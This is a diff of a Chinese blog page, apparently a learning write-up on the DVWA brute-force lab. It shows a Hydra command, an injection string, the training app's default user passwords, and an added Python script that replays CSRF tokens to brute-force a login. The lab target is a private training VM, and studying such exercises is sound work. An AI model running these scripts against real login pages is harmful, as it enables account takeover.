@@ -110,22 +110,22 @@
 
 
 
-  <meta name="description" content="前言最近想要再系统地过一遍一些基础的渗透漏洞知识, 看到网上不少人推荐 DVWA 这个平台, 就试了一下, 发现的确很适合初学者, 最主要有源码比较这个功能让人能很好地理解利用这个漏洞的原理和过程. 我知道如果 Google 能搜出很多关于 DVWA 的攻略和总结, 本系列文章也是我学习时的总结, 带有很强的主观意识, 也不保证写的全是正确的, 欢迎大家在留言区留言, 大家一起讨论 :) 爆破时遇">
+  <meta name="description" content="前言最近想要再系统地过一遍一些基础的渗透漏洞知识, 看到网上不少人推荐 DVWA 这个平台, 就试了一下, 发现的确很适合初学者, 最主要有源码比较这个功能让人能很好地理解利用这个漏洞的原理和过程. 我知道如果 Google 能搜出很多关于 DVWA 的攻略和总结, 本系列文章也是我学习时的总结, 带有很强的主观意识, 也不保证写的全是正确的, 欢迎大家在留言区留言, 大家一起讨论 :)">
 <meta name="keywords" content="DVWA,学习总结,爆破">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DVWA-brute">
 <meta property="og:url" content="https://qmsharing.space/2018/11/28/DVWA-brute/index.html">
 <meta property="og:site_name" content="Qm&#39;s Blog">
-<meta property="og:description" content="前言最近想要再系统地过一遍一些基础的渗透漏洞知识, 看到网上不少人推荐 DVWA 这个平台, 就试了一下, 发现的确很适合初学者, 最主要有源码比较这个功能让人能很好地理解利用这个漏洞的原理和过程. 我知道如果 Google 能搜出很多关于 DVWA 的攻略和总结, 本系列文章也是我学习时的总结, 带有很强的主观意识, 也不保证写的全是正确的, 欢迎大家在留言区留言, 大家一起讨论 :) 爆破时遇">
+<meta property="og:description" content="前言最近想要再系统地过一遍一些基础的渗透漏洞知识, 看到网上不少人推荐 DVWA 这个平台, 就试了一下, 发现的确很适合初学者, 最主要有源码比较这个功能让人能很好地理解利用这个漏洞的原理和过程. 我知道如果 Google 能搜出很多关于 DVWA 的攻略和总结, 本系列文章也是我学习时的总结, 带有很强的主观意识, 也不保证写的全是正确的, 欢迎大家在留言区留言, 大家一起讨论 :)">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://qmsharing.space/2018/11/28/DVWA-brute/dvwa/brute/wrong1.PNG">
 <meta property="og:image" content="https://qmsharing.space/2018/11/28/DVWA-brute/dvwa/brute/prove1.PNG">
 <meta property="og:image" content="https://qmsharing.space/2018/11/28/DVWA-brute/dvwa/brute/prove2.PNG">
 <meta property="og:image" content="https://qmsharing.space/2018/11/28/DVWA-brute/dvwa/brute/prove3.PNG">
-<meta property="og:updated_time" content="2018-11-28T16:32:16.765Z">
+<meta property="og:updated_time" content="2018-11-29T16:16:11.644Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DVWA-brute">
-<meta name="twitter:description" content="前言最近想要再系统地过一遍一些基础的渗透漏洞知识, 看到网上不少人推荐 DVWA 这个平台, 就试了一下, 发现的确很适合初学者, 最主要有源码比较这个功能让人能很好地理解利用这个漏洞的原理和过程. 我知道如果 Google 能搜出很多关于 DVWA 的攻略和总结, 本系列文章也是我学习时的总结, 带有很强的主观意识, 也不保证写的全是正确的, 欢迎大家在留言区留言, 大家一起讨论 :) 爆破时遇">
+<meta name="twitter:description" content="前言最近想要再系统地过一遍一些基础的渗透漏洞知识, 看到网上不少人推荐 DVWA 这个平台, 就试了一下, 发现的确很适合初学者, 最主要有源码比较这个功能让人能很好地理解利用这个漏洞的原理和过程. 我知道如果 Google 能搜出很多关于 DVWA 的攻略和总结, 本系列文章也是我学习时的总结, 带有很强的主观意识, 也不保证写的全是正确的, 欢迎大家在留言区留言, 大家一起讨论 :)">
 <meta name="twitter:image" content="https://qmsharing.space/2018/11/28/DVWA-brute/dvwa/brute/wrong1.PNG">
 
 
@@ -360,12 +360,24 @@
                 
               
 
-              <time title="创建时间：2018-11-28 10:37:22 / 修改时间：16:32:16" itemprop="dateCreated datePublished" datetime="2018-11-28T10:37:22Z">2018-11-28</time>
+              <time title="创建时间：2018-11-28 10:37:22" itemprop="dateCreated datePublished" datetime="2018-11-28T10:37:22Z">2018-11-28</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2018-11-29 16:16:11" itemprop="dateModified" datetime="2018-11-29T16:16:11Z">2018-11-29</time>
               
             
           </span>
@@ -432,12 +444,14 @@
 
       
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近想要再系统地过一遍一些基础的渗透漏洞知识, 看到网上不少人推荐 DVWA 这个平台, 就试了一下, 发现的确很适合初学者, 最主要有源码比较这个功能让人能很好地理解利用这个漏洞的原理和过程. 我知道如果 Google 能搜出很多关于 DVWA 的攻略和总结, 本系列文章也是我学习时的总结, 带有很强的主观意识, 也不保证写的全是正确的, 欢迎大家在留言区留言, 大家一起讨论 :)</p>
+<a id="more"></a>
+<h2 id="本题任务"><a href="#本题任务" class="headerlink" title="本题任务:"></a>本题任务:</h2><p>通过暴力破解出管理员 admin 的密码. 还有四个隐藏用户等待你的挖掘 ;)</p>
 <h2 id="爆破时遇到问题"><a href="#爆破时遇到问题" class="headerlink" title="爆破时遇到问题:"></a>爆破时遇到问题:</h2><p><strong>Hydra 爆破时返回的结果不正确, 而且返回的就是字典头几个数值:</strong></p>
 <p>我一开始直接用下面的命令进行爆破:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 172.28.128.4 -l admin -P Downloads/password.txt http-get-form "/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect."</span><br></pre></td></tr></table></figure>
 <p><img src="/2018/11/28/DVWA-brute/dvwa/brute/wrong1.PNG" alt="爆破结果图"></p>
 <p>这结果肯定不对… 直接把前15个爆破密码返回了. 造成这个情况的可能性有两个, 都可以通过 curl 指令来检查. 第一个可能性是你的网络出问题了, 有时 hydra 在连不上服务器时会错误的认为返回的结果是正确的, 然而我当时返回的是 proxy error. 第二个可能性是你漏了一些必要参数(Cookies), 这个的确容易忽略, 这里我用 wireshark 进行抓包查看问题.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 附上怎么用 curl 指令来检测, 注意 get 参数的连接符 "&amp;", 要 escape 它不然会出问题的</span><br><span class="line">curl -b "security=low;PHPSESSID=f2uni4k3m1ftf4o7vunc1qud30" -o result.html http://172.28.128.4/vulnerabilities/brute/index.php?username=admin\&amp;password=admin\&amp;Login=Login</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 附上怎么用 curl 指令来检测, 注意 get 参数的连接符 <span class="string">"&amp;"</span>, 要 escape 它不然会出问题的</span></span><br><span class="line">curl -b "security=low;PHPSESSID=f2uni4k3m1ftf4o7vunc1qud30" -o result.html http://172.28.128.4/vulnerabilities/brute/index.php?username=admin\&amp;password=admin\&amp;Login=Login</span><br></pre></td></tr></table></figure>
 <p><img src="/2018/11/28/DVWA-brute/dvwa/brute/prove1.PNG" alt="wireshark 结果"></p>
 <p>可以看出它被重定向了,  查看详细信息会发现它被重定向回 “Location: ../../login.php\r\n”, 也就是一开始的登录界面, (这个登录界面是你登录 dvwa 的界面, 而不是你进行爆破的登录界面), 通过 firefox 抓包, 可以看到我们每次提交 get 请求时会先提交 PHPSESSID 来帮助服务器确定你已经登录了, 否则就会被重定向.</p>
 <p><img src="/2018/11/28/DVWA-brute/dvwa/brute/prove2.PNG" alt="Cookies"></p>
@@ -450,7 +464,8 @@
 <h4 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h4><p>的确毫无安全措施, 除了能被爆破还能被 SQL 注入, 利用 ‘ or 1=1 limit 1,1 # 就能把几个用户全部爆破出来. 然后通过显示的图片可以大概猜到用户名是什么, 继续用字典进行爆破.</p>
 <h4 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h4><p>这个相比于 Low 等级多加了 <code>mysqli_real_escape_string</code> 函数来防止 SQL 注入, 但并有从本质上解决爆破问题(差点没看到新添加的 sleep(2), 但你觉得黑客会少那几分钟(难道黑客不会开多线程)吗?)</p>
 <h4 id="High"><a href="#High" class="headerlink" title="High"></a>High</h4><p>这次是在表单添加了一个隐藏的 token, 这个 token 在表单被提交的时候一同提交, 网站先验证这个 token 是否与其在服务端保存的相同, 不相同则拒绝服务. 这个 token 主要用来防止 CSRF 漏洞, 也顺带把 hydra 给防了.</p>
-<p>但这也并不代表它已经无懈可击了, 我们可以通过 python(或其他手段) 来先获得一次界面的 token 后, 再通过下一次的尝试发送出去, 这样也是能实现爆破的, 其他的比如登录失败时随机睡眠个几秒的也是不能解决问题的.</p>
+<p>但这也并不代表它已经无懈可击了, 我们可以通过 python(或其他手段) 来先获得一次界面的 token 后, 再通过下一次的尝试发送出去, 这样也是能实现爆破的, 其他的比如登录失败时随机睡眠个几秒的也是不能解决问题的.<br>附上当时写的 python 脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">header = &#123;<span class="string">'Host'</span>: <span class="string">'172.28.128.4'</span>,</span><br><span class="line">                  <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36'</span>,</span><br><span class="line">          <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line">          <span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=3fnsi3uvhb068gmb3a1d1vnpb5'</span>&#125;</span><br><span class="line">requrl = <span class="string">"http://172.28.128.4/vulnerabilities/brute/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token_and_length</span><span class="params">(requrl, header, is_first=False)</span>:</span></span><br><span class="line">    req = urllib2.Request(url=requrl, headers=header)</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    <span class="keyword">print</span> response.getcode(),</span><br><span class="line">    the_page = response.read()</span><br><span class="line">    length = len(the_page)</span><br><span class="line">    <span class="keyword">print</span> length</span><br><span class="line">    soup = BeautifulSoup(the_page, <span class="string">"html.parser"</span>)</span><br><span class="line">    <span class="comment"># get the user_token</span></span><br><span class="line">    user_token = soup.select(<span class="string">'input[type="hidden"]'</span>)[<span class="number">0</span>].get(<span class="string">'value'</span>)</span><br><span class="line">    <span class="keyword">return</span> (user_token.decode(<span class="string">'unicode-escape'</span>).encode(<span class="string">'utf-8'</span>), length)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wrong_len = <span class="number">0</span></span><br><span class="line">user_token = get_token_and_length(requrl, header)[<span class="number">0</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/home/j4nobdy/Downloads/password.txt"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> fd.readlines():</span><br><span class="line">        requrl = <span class="string">"http://172.28.128.4/vulnerabilities/brute/"</span> + \</span><br><span class="line">            <span class="string">"?username=admin&amp;password="</span> + line.strip() + <span class="string">"&amp;Login=Login&amp;user_token="</span> + user_token</span><br><span class="line">        <span class="keyword">print</span> i, <span class="string">'admin'</span>, line.strip(),</span><br><span class="line">        res = get_token_and_length(requrl, header)</span><br><span class="line">        user_token = res[<span class="number">0</span>]</span><br><span class="line">        length = res[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            wrong_len = length</span><br><span class="line">        <span class="keyword">elif</span> wrong_len != length:</span><br><span class="line">            sys.exit(<span class="string">'Congrat! Found password!'</span>)</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'No valid password found!'</span></span><br></pre></td></tr></table></figure>
 <h4 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h4><ol>
 <li>增加了登录错误次数限制(本质上解决问题的方法), 这里作者还提醒了如果乱用反馈信息的话, 会让攻击者可以对账户进行枚举. 不过其实这样解决问题还是有个不太安全的地方, 如果有人恶意对一个已知号码进行多次错误, 就会导致被攻击用户被锁定, 也间接造成了拒绝服务攻击, 所以可以考虑在登录前再进行一次验证, 不过其实已经够用了.</li>
 <li>改用了 post 方法来提交表单, 这样避免了把用户名和密码明文放在 url 中进行传递, 是一种安全的方法.</li>
@@ -468,18 +483,13 @@
 <li><p>我发现用户名输入中文的话, 即使在 Impossible 级别, 也会出现界面崩溃的情况, 估计是 PDO 的编码问题.</p>
 </li>
 </ol>
-<div align="center"> <font color="red"><b>========== 剧透警告线 ==========</b></font></div>
-
-
-
-
-
+<p><br><br><br></p>
+<p><div align="center"> <font color="red"><b>============================== 剧透警告线 ==============================</b></font></div><br><br><br><br></p>
 <p>爆破出额外的用户:</p>
-<p>u: gordonb p: abc123</p>
-<p>u: pablo p: letmein</p>
-<p>u: smithy p: password</p>
-<p>u: 1337 p: charley # 这个我没有爆出来, 后来查了数据库拿到密码的 md5, 用彩虹桥碰撞了出来</p>
-
+<p><span style="background-color: black;color: black;">u: gordonb p: abc123</span><br><span style="background-color: black;color: black;">u: pablo p: letmein</span> </p>
+<p><span style="background-color: black;color: black;">u: smithy p: password</span> </p>
+<p><span style="background-color: black;color: black;">u: 1337 p: charley</span> </p>
+<h1 id="这个我没有爆出来-后来查了数据库拿到密码的-md5-用彩虹桥碰撞了出来"><a href="#这个我没有爆出来-后来查了数据库拿到密码的-md5-用彩虹桥碰撞了出来" class="headerlink" title="这个我没有爆出来, 后来查了数据库拿到密码的 md5, 用彩虹桥碰撞了出来"></a>这个我没有爆出来, 后来查了数据库拿到密码的 md5, 用彩虹桥碰撞了出来</h1>
       
     </div>
 
@@ -747,7 +757,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破时遇到问题"><span class="nav-number">2.</span> <span class="nav-text">爆破时遇到问题:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Low"><span class="nav-number">2.0.1.</span> <span class="nav-text">Low</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Medium"><span class="nav-number">2.0.2.</span> <span class="nav-text">Medium</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#High"><span class="nav-number">2.0.3.</span> <span class="nav-text">High</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Impossible"><span class="nav-number">2.0.4.</span> <span class="nav-text">Impossible</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本题任务"><span class="nav-number">2.</span> <span class="nav-text">本题任务:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破时遇到问题"><span class="nav-number">3.</span> <span class="nav-text">爆破时遇到问题:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Low"><span class="nav-number">3.0.1.</span> <span class="nav-text">Low</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Medium"><span class="nav-number">3.0.2.</span> <span class="nav-text">Medium</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#High"><span class="nav-number">3.0.3.</span> <span class="nav-text">High</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Impossible"><span class="nav-number">3.0.4.</span> <span class="nav-text">Impossible</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#这个我没有爆出来-后来查了数据库拿到密码的-md5-用彩虹桥碰撞了出来"><span class="nav-number"></span> <span class="nav-text">这个我没有爆出来, 后来查了数据库拿到密码的 md5, 用彩虹桥碰撞了出来</span></a></div>
             
 
           </div>
